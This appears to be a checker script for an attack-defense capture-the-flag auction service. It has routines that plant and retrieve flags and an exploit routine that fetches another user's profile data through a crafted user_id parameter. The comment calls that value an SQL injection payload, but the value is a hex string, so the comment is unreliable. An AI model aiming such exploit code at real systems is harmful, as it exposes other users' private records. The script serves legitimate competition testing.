from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import re
import faker
from httpx import AsyncClient, Response
from typing import Optional
from logging import LoggerAdapter
import sympy 
import gmpy2
from bs4 import BeautifulSoup

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

import logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)


checker = Enochecker("secureauction", 8181)
app = lambda: checker.app


async def signup(client: AsyncClient, user_name, password, user_type='REGULAR'):
    logger.info(f"Starting signup process for user: {user_name}")
    signup_data = {
        "user_name": user_name,
        "password": password,
        "user_type": user_type,
        "action": "signup"
    }
    response = await client.post("index.php", data=signup_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for signup process")
    
    if status_code in [200,302]:
        # Check if a redirection occurred
        if 'Location' in response.headers:
            new_url = response.headers['Location']
            response = await client.get(new_url)  # Fetch the redirected page
            status_code = response.status_code
            logger.info(f"Received status code {status_code} for redirected page")

        logger.debug(f"Signup response HTML: {response.text}")
        if user_type == 'PREMIUM':
            # Parse the private key and user_id from the response
            soup = BeautifulSoup(response.text, 'html.parser')
            logger.debug(f"Signup response parsed HTML: {soup.prettify()}")
            
            private_key_elements = soup.find_all('p', class_='key-chunk')
            private_key = ''.join(element.text for element in private_key_elements)
            
            user_id_element = soup.find('input', id='userId')
            user_id = user_id_element['value'] if user_id_element else None # type: ignore
            
            logger.info(f"Parsed private key: {private_key} and user_id: {user_id}")
            return private_key, user_id
        
        elif user_type == 'REGULAR':   
            return 
        else: 
            logger.error(f"Invalid user type: {user_type}")
    else:
        logger.error(f"Failed to sign up the user. {status_code}")
        raise MumbleException(f"Failed to sign up the user. {status_code}")


async def login(client: AsyncClient, user_name, password, user_type='REGULAR'):
    logger.info(f"Starting login process for user: {user_name}")
    login_data = {
        "user_name": user_name,
        "password": password,
        "user_type": user_type,
        "action": "login"
    }
    response = await client.post("index.php", data=login_data)
    status_code = response.status_code
    logger.info(f"Received status code {status_code} for login process")
    if status_code != 302:
        logger.error(f"Failed to log in the user. {status_code}")
        raise MumbleException(f"Failed to log in the user. {status_code}")


async def create_item(client: AsyncClient, item_name, start_price, item_type='REGULAR') -> int:
    logger.info(f"Attempting to create item: {item_name}")
    item_data = {
        "item_name": item_name,
        "start_price": start_price,
        "item_type": item_type
    }
    logger.debug(f"Item data: {item_data}")  # Logging the item_data
    response = await client.post("create_item.php", data=item_data)
    logger.debug(f"Create item response: {response.text}")

    if response.status_code  == 302:
        redirect_uri = response.headers['Location']
        logger.debug(f"Redirect URI: {redirect_uri}")
        return int(redirect_uri[redirect_uri.index("=") + 1:])
    else:
        logger.error(f"Failed to create the item. Status code: {response.status_code}")
        raise MumbleException("Failed to create the item.")


async def place_bid(client: AsyncClient, item_id, bid):
    item_data = {
        "item_id": item_id,
        "bid_amount": bid
    }
    response = await client.post("place_bid.php", data=item_data)
    logger.debug(f"Response status code from place_bid.php: {response.status_code}")  # Logging the status code

    if response.status_code == 200: # successful JSON response
        try:
            json_data =  response.json()
            logger.debug(f"Received JSON data: {json_data}")
            logger.debug(f"Response JSON data from place_bid.php: {json_data}")  # Log the whole JSON data
            encrypted_bid = json_data.get('encrypted_bid', None)  # Use get() method to avoid KeyErrors
            if encrypted_bid:
                logger.debug(f"Place bid item_id: {item_id}, bid_amount: {bid}, Received encrypted bid: {encrypted_bid}")
            else:
                logger.debug(f"encrypted_bid field not found in the response data")
            return encrypted_bid
        except Exception as e:
            logger.error(f"Error while processing response: {e}")
    elif response.status_code == 302: # 302 is the status code for a redirection (non-PREMIUM users)
        logger.debug(f"Redirected for item_id: {item_id}, bid_amount: {bid}")  # Logging the redirection
        return
    else:
        raise MumbleException("Failed to place bid.")


async def scrape_webpage(client: AsyncClient, logger: LoggerAdapter):
    
    url = "user_index.php"  # The URL of the webpage to scrape

    logger.info("scrape_webpage: Starting to scrape webpage: %s", url)

    response = await client.get(url)

    # Check if request was successful
    if response.status_code != 200:
        logger.error("scrape_webpage: Failed to fetch page: %s", url)
        raise Exception(f"Failed to fetch page: {url}")

    logger.info("scrape_webpage: Successful request. Parsing content with BeautifulSoup.")

    # Parse the content of the request with BeautifulSoup
    soup = BeautifulSoup(response.text, 'html.parser')

    # Find the table
    table = soup.find('table')

    if table is None:
        logger.error("scrape_webpage: No table found in the page.")
        raise Exception("No table found in the page.")

    # Find all table rows
    rows = table.find_all('tr')

    if not rows:
        logger.error("scrape_webpage: No rows found in the table.")
        raise Exception("No rows found in the table.")

    start_prices = []
    RSA_E = ''
    RSA_N = ''

    logger.info("scrape_webpage: Iterating through table rows.")

    # Iterate through all rows
    for row in rows:
        # Find all columns in each row
        cols = row.find_all('td')
        
        # If there are no 'td' elements, skip this row
        if not cols:
            continue

        # Strip the text of each column
        cols = [col.text.strip() for col in cols]
        
        # If item type is not PREMIUM, skip this row
        if cols[3] != 'PREMIUM':  # assuming 'Item Type' is the 4th column
            continue

        logger.info("scrape_webpage: Found a PREMIUM item.")

        # Append the start price to the list
        start_prices.append(cols[2])  # assuming 'Start Price' is the 3rd column
        RSA_E = cols[6]  # assuming 'RSA_E' is the 7th column
        RSA_N = cols[7]  # assuming 'RSA_N' is the 8th column

    logger.info("scrape_webpage: Finished scraping. Found %s PREMIUM items.", len(start_prices))

    return start_prices, RSA_E, RSA_N


@checker.putflag(0)
async def putflag_note(
        task: PutflagCheckerTaskMessage,
        db: ChainDB,
        client: AsyncClient,
        logger: LoggerAdapter,
) -> str:
    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))

    await signup(client, user_name, password, 'REGULAR')

    item_name = ''.join(random.choices(string.ascii_lowercase, k=10))

    item_id = await create_item(client, item_name, 0,  'REGULAR')
    await place_bid(client, item_id, task.flag)

    await db.set("item", (user_name, password, item_name))

    return user_name
    

@checker.getflag(0)
async def getflag_note(
        task: GetflagCheckerTaskMessage,
        db: ChainDB,
        logger: LoggerAdapter,
        client: AsyncClient
) -> None:
    try:
        user_name, password, item_name = await db.get("item")
    except KeyError:
        raise MumbleException("Item missing")
    
    await login(client, user_name, password, 'REGULAR')

    response = await client.get(f"my_profile.php")
    logger.debug(response.text)
    assert_in(task.flag, response.text, "Flag missing")


@checker.exploit(0)
async def exploit(
    task: ExploitCheckerTaskMessage,
    client: AsyncClient,
    searcher: FlagSearcher,
    logger: LoggerAdapter  
) -> Optional[str]:

    user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    password = ''.join(random.choices(string.ascii_lowercase, k=10))

    logger.debug(f"Generated user_name: {user_name}")
    logger.debug(f"Generated password: {password}")

    await signup(client, user_name, password)

    # SQL Injection payload, returning all records regardless of the user_id.
    SQL_INJECTION_PAYLOAD = "746a759a17e08411460812f472483104"
    exploit_url = f"/my_profile.php?user_id={SQL_INJECTION_PAYLOAD}"

    response = await client.get(exploit_url)

    logger.debug(f"Exploit response status code: {response.status_code}")

    if response.status_code == 200:
        # look for the flag directly
        if flag := searcher.search_flag(response.text):
            return flag

        else:
            logger.warning("Flag not found in the response.")
    else:
        logger.warning("Exploit request failed.")
        raise MumbleException("Exploit Failed!")


if __name__ == "__main__":
    checker.run()